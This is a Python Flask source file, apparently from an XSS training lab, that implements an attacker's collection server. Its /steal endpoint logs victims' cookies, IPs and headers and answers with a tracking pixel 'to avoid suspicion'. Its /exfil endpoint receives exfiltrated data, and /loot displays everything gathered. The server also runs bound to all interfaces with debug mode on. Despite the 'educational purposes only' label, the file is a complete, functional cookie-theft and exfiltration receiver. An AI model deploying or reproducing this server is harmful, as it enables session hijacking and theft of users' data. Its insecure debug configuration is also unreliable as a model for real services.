"""
Attacker simulation server.
Collects stolen cookies and data during XSS demos.
FOR EDUCATIONAL PURPOSES ONLY.
"""

from flask import Flask, request
from datetime import datetime
import json
import os

app = Flask(__name__)

LOOT_FILE = "/app/loot.json"

def save_loot(entry):
    loot = []
    if os.path.exists(LOOT_FILE):
        with open(LOOT_FILE, "r") as f:
            try:
                loot = json.load(f)
            except json.JSONDecodeError:
                loot = []
    loot.append(entry)
    with open(LOOT_FILE, "w") as f:
        json.dump(loot, f, indent=2)

@app.route("/steal", methods=["GET", "POST"])
def steal_cookie():
    cookie = request.args.get("c", request.form.get("c", "N/A"))
    entry = {
        "timestamp": datetime.now().isoformat(),
        "type": "cookie_theft",
        "cookie": cookie,
        "user_agent": request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
        "ip": request.remote_addr,
    }
    save_loot(entry)
    print(f"[!] COOKIE STOLEN: {cookie[:80]}...")
    # Return transparent pixel to avoid suspicion
    return b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'}

@app.route("/exfil", methods=["POST"])
def exfiltrate_data():
    data = request.get_json(silent=True) or request.form.to_dict()
    entry = {
        "timestamp": datetime.now().isoformat(),
        "type": "data_exfiltration",
        "data": data,
        "ip": request.remote_addr,
    }
    save_loot(entry)
    print(f"[!] DATA EXFILTRATED: {json.dumps(data)[:200]}")
    return "", 204

@app.route("/loot")
def view_loot():
    if os.path.exists(LOOT_FILE):
        with open(LOOT_FILE, "r") as f:
            return f.read(), 200, {"Content-Type": "application/json"}
    return "[]", 200, {"Content-Type": "application/json"}

@app.route("/")
def index():
    return """
    <h1>Attacker C2 Server (Demo)</h1>
    <p>Endpoints:</p>
    <ul>
        <li><code>GET /steal?c=COOKIE</code> — Steal cookies</li>
        <li><code>POST /exfil</code> — Exfiltrate data</li>
        <li><code>GET /loot</code> — View collected loot</li>
    </ul>
    <p><strong>FOR EDUCATIONAL PURPOSES ONLY</strong></p>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8888, debug=True)
